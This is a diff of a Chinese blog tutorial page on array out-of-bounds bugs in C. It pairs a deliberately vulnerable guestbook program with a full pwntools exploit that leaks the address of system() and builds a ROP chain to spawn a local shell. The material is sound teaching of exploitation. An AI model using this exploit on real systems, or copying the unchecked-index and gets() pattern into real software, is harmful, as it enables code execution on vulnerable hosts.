@@ -1,4 +1,427 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png"><link rel="mask-icon" href="/images/logo.svg" color="#222"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"www.leeyuxun.github.io",root:"/",scheme:"Gemini",version:"7.8.0",exturl:!1,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!1},copycode:{enable:!0,show_result:!0,style:"mac"},back2top:{enable:!0,sidebar:!0,scrollpercent:!0},bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"./public/search.xml"}</script><meta name="description" content="基础知识数组的原理数组是内存中一段连续的存储空间，一个数组中包含多个类型相同的数组元素；数组通过数组名在内存中找到对应的数组空间；数组元素通过数组名和索引获取；"><meta property="og:type" content="article"><meta property="og:title" content="二进制-数组越界漏洞"><meta property="og:url" content="https://www.leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E.html"><meta property="og:site_name" content="Leeyuxun の blog"><meta property="og:description" content="基础知识数组的原理数组是内存中一段连续的存储空间，一个数组中包含多个类型相同的数组元素；数组通过数组名在内存中找到对应的数组空间；数组元素通过数组名和索引获取；"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210210100132.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210223113130.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210223114222.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210223175347.png"><meta property="og:image" content="https://www.leeyuxun.github.io/Users/leeyuxun/Library/Application%20Support/typora-user-images/image-20210223175837035.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210302150912.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210302154218.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210302155427.png"><meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210302152456.png"><meta property="article:published_time" content="2021-02-10T01:51:59.000Z"><meta property="article:modified_time" content="2021-03-02T07:55:56.408Z"><meta property="article:author" content="李钰璕"><meta property="article:tag" content="数组越界"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210210100132.png"><link rel="canonical" href="https://www.leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E.html"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0,lang:"zh-CN"}</script><title>二进制-数组越界漏洞 | Leeyuxun の blog</title><script>function sendPageView(){if(CONFIG.hostname===location.hostname){var e=localStorage.getItem("uid")||Math.random()+"."+Math.random();localStorage.setItem("uid",e),navigator.sendBeacon("https://www.google-analytics.com/collect",new URLSearchParams({v:1,tid:"UA-163555158-1",cid:e,t:"pageview",dp:encodeURIComponent(location.pathname)}))}}document.addEventListener("pjax:complete",sendPageView),sendPageView()</script><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span><h1 class="site-title">Leeyuxun の blog</h1><span class="logo-line-after"><i></i></span></a><p class="site-subtitle" itemprop="description">BUPT | SCSS</p></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div id="search-result"><div id="no-result"><i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></div></header><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content post posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E.html"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.png"><meta itemprop="name" content="李钰璕"><meta itemprop="description" content="从0开始学习网络安全"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Leeyuxun の blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">二进制-数组越界漏洞</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2021-02-10 09:51:59" itemprop="dateCreated datePublished" datetime="2021-02-10T09:51:59+08:00">2021-02-10</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2021-03-02 15:55:56" itemprop="dateModified" datetime="2021-03-02T15:55:56+08:00">2021-03-02</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">二进制学习</span></a> </span></span><span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="post-meta-item-text">阅读次数：</span> <span id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="数组的原理"><a href="#数组的原理" class="headerlink" title="数组的原理"></a>数组的原理</h2><ul><li>数组是内存中一段连续的存储空间，一个数组中包含多个类型相同的数组元素；</li><li>数组通过数组名在内存中找到对应的数组空间；</li><li>数组元素通过数组名和索引获取；<a id="more"></a></li></ul><p>如下程序定义了含有10个元素的数组a，依次打印出数组元素的地址；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a's address: %p\n"</span>, &amp;a);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        a[i] = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"a[%d]'s address: %p\n"</span>, i, &amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果显示，各个元素之间的地址相差一个int类型数值的大小，a[4]的地址与a的地址相 差0x10个字节，即4*sizeof(int)大小；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210210100132.png" style="zoom:40%"></p><p>通过IDA的反汇编进一步明确元素的寻址方式，IDA能够获取各个变量用ebp表示出的地址，数组a的地址为<code>ebp-0x34</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210223113130.png" style="zoom:50%"></p><p>下图汇编语言中，变量i的地址是<code>ebp-0x0C</code>，将i的值赋给eax和edx，然后将edx的值赋给数组元素；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210223114222.png" style="zoom:50%"></p><p>每个数组元素的地址为<code>ebp-0x34+eax*4</code>，其中<code>ebp-0x34</code>是数组a的地址，<code>eax*4</code>是索引<code>i*sizeof(int)</code>；</p><p>因此，确定<strong>数组元素寻址方式</strong>为<code>数组地址+索引*数组元素大小</code>；</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>C和C++不对数组做边界检查，除了语言对编程人员信任和程序性能的顾虑外，C和C++的数组边界检查本身也是一件困难的事情：</p><ul><li>数组越界的判定不仅依赖于下标的值，也依赖于指针的类型；</li><li>对于指向数组的指针来说，在程序中若没有显式的指明数组长度，还需要证明其地址计算结果位于该数组内；</li><li>程序运行时，数组可能重新进行了动态分配，长度发生了变化；</li></ul><p>这些情况使得边界检查将会给程序性能带来极大的负担，C和C++中并不能很好的防范数组越界漏洞；</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="漏洞源码"><a href="#漏洞源码" class="headerlink" title="漏洞源码"></a>漏洞源码</h2><p>以如下程序为例进行漏洞分析；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* guestbook.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> **tmp;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *sys;</span><br><span class="line">    <span class="keyword">int</span> flag;</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">char</span> *dest[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">int</span> choice;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x14</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Please setup your guest book"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">3</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Name for guest: #%d\n&gt;&gt;&gt;"</span>,i);</span><br><span class="line">        name = <span class="built_in">malloc</span>(<span class="number">0xf</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%15s"</span>,name);</span><br><span class="line">        getchar();</span><br><span class="line">        name[<span class="number">14</span>]=<span class="number">0</span>;</span><br><span class="line">        dest[i]=name;</span><br><span class="line">    &#125;</span><br><span class="line">    tmp = dest;</span><br><span class="line">    sys = &amp;system;</span><br><span class="line">    flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"---------------------------"</span>);</span><br><span class="line">    	<span class="built_in">puts</span>(<span class="string">"1: View name"</span>);</span><br><span class="line">    	<span class="built_in">puts</span>(<span class="string">"2: Change name"</span>);</span><br><span class="line">    	<span class="built_in">puts</span>(<span class="string">"3. Quit"</span>);</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"&gt;&gt;"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;choice);</span><br><span class="line">        getchar();</span><br><span class="line">		<span class="keyword">switch</span>(choice)&#123;</span><br><span class="line">	    	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"Which entry do you want to view?\n&gt;&gt;&gt;"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;num);</span><br><span class="line">                getchar();</span><br><span class="line">                <span class="keyword">if</span>(num&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                	<span class="built_in">puts</span>(dest[num]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">"Enter a valid number"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//readName(dest);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Which entry do you want to change?\n&gt;&gt;&gt;"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;num);</span><br><span class="line">                getchar();</span><br><span class="line">                <span class="keyword">if</span>(num&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                     <span class="built_in">printf</span>(<span class="string">"Enter the name of the new guest.\n&gt;&gt;&gt;"</span>);</span><br><span class="line">                     gets(&amp;s);</span><br><span class="line">                     <span class="built_in">strcpy</span>(dest[num], &amp;s);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">"Enter a valid number"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                flag = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"Not a valid option. Try again"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>代码实现了简单的查看名字和修改名字的功能，用户输入4个名字后，把字符串所在的地址存入指针数组dest中；</li><li>在case1中，通过输入序号查看对应的名字;</li><li>在case2中，通过输入序号修改对应的名字；</li><li>这两个环节没有对输入的序号做检查，由于数组dest只有4个元素，当输入的序号大于3或小于0，都会造成数组越界；</li></ul><p>运行guestbook</p><ul><li><p>查看功能输入大于3的序号，会输出乱码；</p></li><li><p>修改功能输入大于3的序号则会出现段错误；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210223175347.png" style="zoom:40%"></p></li></ul><p>由此判断本程序中的<strong>数组越界漏洞</strong>能够<strong>对内存进行查看和修改</strong>；</p><h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><p>程序中sys变量记录了system函数的地址，利用的思路是，通过数组越界读取sys变量的值即system函数的地址，并利用数组越界构造ROP覆写返回地址为system函数，最终获取shell：</p><ul><li><p>读取system地址：</p><p>程序中将system函数的地址写在了sys变量里，通过IDA来查看该变量的地址；</p><p><img src="/Users/leeyuxun/Library/Application Support/typora-user-images/image-20210223175837035.png" alt="image-20210223175837035" style="zoom:50%"></p><ul><li>s[4]即为dest数组的地址为<code>ebp-0x2C</code>；</li><li>V5记录了system的地址，为<code>ebp-0x1C</code>；</li></ul></li></ul><p>结合gdb调试进行进一步观察 ，在system地址赋值之后设置断点，查看栈中内容如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210302150912.png" style="zoom:50%"></p><ul><li>数组dest中存放字符串地址，接下来是system地址和dest地址；</li><li>由于数组dest的参数是字符串地址，为了读出system地址，输入序号5，这样越过数组dest的边界覆盖了紧邻的<code>0xffffcfbc</code>，即dest数组的地址；</li><li>puts函数会在遇到<code>\0</code>时停止输出，因此可以从<code>0xffffcfbc</code>一直往后读直到遇到结束符<code>\0</code>，里面就包含了system函数地址；</li></ul><h2 id="构造ROP劫持程序流"><a href="#构造ROP劫持程序流" class="headerlink" title="构造ROP劫持程序流"></a>构造ROP劫持程序流</h2><ul><li><p>除了利用数组越界读取数据，还可以对栈中内容进行覆写；</p></li><li><p>构造一个ROP，让<code>function</code>函数返回时执行system函数，从而获取shell；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop = p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(binsh_addr)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x2c</span> + p32(<span class="number">0xdeadbeef</span>) + rop</span><br></pre></td></tr></table></figure></li><li><p>在修改名字时仍然选择序号5，为了能够将ROP覆写从返回地址的位置，填充从<code>0xffffcfbc</code>到返回地址之间的内存；</p></li></ul><p>payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">r= process(<span class="string">"./guestbook"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">'A'</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">'B'</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">'C'</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">'D'</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">data = r.recv(<span class="number">20</span>)</span><br><span class="line">system = u32(data[<span class="number">-4</span>:])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]system:0x%x"</span> %system</span><br><span class="line"></span><br><span class="line">l = ELF(<span class="string">"./guestbook"</span>).libc</span><br><span class="line">l.address = system - l.symbols[<span class="string">'system'</span>]</span><br><span class="line">print(<span class="string">"[*]base: 0x%x"</span> % l.address)</span><br><span class="line"></span><br><span class="line">binsh = l.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]binsh:0x%x"</span> %binsh</span><br><span class="line"></span><br><span class="line">rop = p32(system)+p32(<span class="number">0xdeadbeef</span>)+p32(binsh)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x2c</span> + p32(<span class="number">0xdeadbeef</span>) + rop</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"2"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"3"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><ul><li><p>调试payload，覆写后的栈内容如下；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210302154218.png" style="zoom:50%"></p></li><li><p>在退出函数之前，会执行leave指令，相当于执行<code>mov esp,ebp; pop ebp;</code></p><ul><li>如下图所示，即先将esp赋值为ebp的值<code>0xffa19f1c</code>，然后将弹出的<code>0xdeadbeef</code>赋值给ebp；</li></ul></li><li><p>接着执行ret指令，相当于执行<code>pop eip,eip;</code>，就会指向system函数地址，esp则向下移动到<code>0xffa19f24</code>处；</p></li><li><p>跟踪进入system函数后，后续将先执行<code>sub esp,0xc;</code>，然后通过<code>esp+0x10</code>查找system函数的参数，此时esp为<code>0xffa19f24-0xc = 0xffa19f18</code>，<code>esp+0x10</code>即为<code>0xffa19f28</code>，正好为写入<code>/bin/sh</code>字符串的地址处；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210302155427.png" style="zoom:50%"></p></li></ul><p>执行payload，成功拿到sh权限；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210302152456.png" style="zoom:50%"></p></div><div class="my_post_copyright"><script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script><script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script><script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script><link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css"><link href="css/font-awesome.min.css?v=4.7.0" rel="stylesheet"><script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script><p><span>本文标题: </span><a href="/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E.html">二进制-数组越界漏洞</a></p><p><span>文章作者: </span><a href="/" title="访问 李钰璕 的个人博客">李钰璕</a></p><p><span>发布时间: </span>2021年02月10日 - 09:51</p><p><span>最后更新: </span>2021年03月02日 - 15:55</p><p><span>原始链接: </span><a href="/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E.html" title="二进制-数组越界漏洞"><a href="https://www.leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E.html" title="二进制-数组越界漏洞">https://www.leeyuxun.github.io/二进制-数组越界漏洞.html</a></a></p><p><span>许可协议: </span>本博客所有文章除特别声明外，均采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)"> <i class="fab fa-creative-commons"></i>BY-NC-SA </a>许可协议，转载请注明出处！</p></div><footer class="post-footer"><div class="post-tags"><a href="/tags/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/" rel="tag"><i class="fa fa-tag"></i> 数组越界</a></div><div class="post-nav"><div class="post-nav-item"><a href="/gcc%E7%BC%96%E8%AF%91%E4%B8%AD%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%9A%84%E5%85%B3%E9%97%AD%E5%92%8C%E5%BC%80%E5%90%AF.html" rel="prev" title="gcc编译中保护机制的关闭和开启"><i class="fa fa-chevron-left"></i> gcc编译中保护机制的关闭和开启</a></div><div class="post-nav-item"><a href="/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E.html" rel="next" title="二进制-格式化字符串漏洞">二进制-格式化字符串漏洞 <i class="fa fa-chevron-right"></i></a></div></div></footer></article></div><script>window.addEventListener('tabs:register', () => {
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
